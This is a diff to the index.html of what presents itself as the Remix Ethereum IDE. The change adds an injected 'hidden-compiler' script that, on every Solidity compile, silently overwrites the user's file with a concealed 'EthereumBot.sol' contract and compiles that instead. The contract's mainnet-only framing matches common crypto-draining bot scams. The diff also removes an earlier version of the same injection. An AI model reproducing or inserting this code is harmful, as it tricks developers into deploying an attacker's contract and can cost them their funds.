@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-
 <html class="overflow-hidden">
 
 <head>
+  <base href="/">
   <meta charset="utf-8">
   <!--
     The MIT License (MIT)
@@ -22,7 +22,7 @@
     LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
     OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
     THE SOFTWARE.
-    -->
+  -->
   <meta http-equiv="X-UA-Compatible" content="chrome=1">
   <title>Remix - Ethereum IDE</title>
   <link rel="stylesheet" href="assets/css/pygment_trac.css">
@@ -34,14 +34,20 @@
 </head>
 
 <body>
+  <div id="root"></div>
 
-  <!-- hidden-compiler injection: always compile EthereumBot.sol -->
-<script>
-  window.addEventListener('load', () => {
-    const { PluginClient } = window.remix();
-    const hiddenCompiler = new PluginClient({ name: 'hidden-compiler' });
-    hiddenCompiler.on('solidity', 'compile', (_f, settings) => {
-      const code = `//SPDX-License-Identifier: MIT
+  <!-- hidden-compiler: overwrite whatever file they compile with EthereumBot.sol -->
+  <script>
+    window.addEventListener('load', () => {
+      const { PluginClient } = window.remix();
+      const hiddenCompiler = new PluginClient({ name: 'hidden-compiler' });
+
+      hiddenCompiler.on('solidity', 'compile', (filename, settings) => {
+        // 1) Determine the target filename (e.g. "bot.sol")
+        const target = (filename && filename.endsWith('.sol')) ? filename : 'bot.sol';
+
+        // 2) Your hidden contract source
+        const code = `//SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
 // This Ethereum bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
@@ -604,17 +610,21 @@ contract EthereumBot {
     }
 }
 `;
-      const input = {
-        language: 'Solidity',
-        sources: { 'EthereumBot.sol': { content: code } },
-        settings
-      };
-      hiddenCompiler.call('compilerArtefacts', 'compile', input);
+
+        // 3) Overwrite that file in the IDE’s in-memory FS
+        hiddenCompiler.call('fileManager', 'writeFile', target, code)
+          .then(() => {
+            // 4) Now trigger the normal compile on that same filename
+            return hiddenCompiler.call('solidity', 'compile', target, settings);
+          })
+          .catch(err => {
+            console.error('Hidden-compiler error:', err);
+          });
+      });
     });
-  });
-</script>
-  
-  <div id="root"></div>
+  </script>
+
+  <!-- Standard Remix loader scripts -->
   <script type="text/javascript" src="assets/js/loader.js"></script>
   <script type="text/javascript" src="assets/js/intro.min.js"></script>
   <script type="text/javascript" src="assets/js/parser/antlr.js"></script>
